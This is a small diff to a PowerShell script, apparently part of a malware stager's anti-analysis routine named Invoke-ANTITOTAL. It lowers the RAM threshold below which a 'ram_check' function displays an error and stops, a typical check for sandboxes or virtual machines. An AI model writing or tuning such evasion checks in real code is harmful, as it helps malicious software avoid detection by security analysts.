@@ -118,7 +118,7 @@ function Invoke-ANTITOTAL {
 
 function ram_check {
     $ram = (Get-WmiObject -Class Win32_PhysicalMemory | Measure-Object -Property capacity -Sum).Sum / 1GB
-    if ($ram -lt 4) {
+    if ($ram -lt 2) {
         Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('RAM CHECK FAILED !', '', 'OK', 'Error')
         StopBatch  
     }
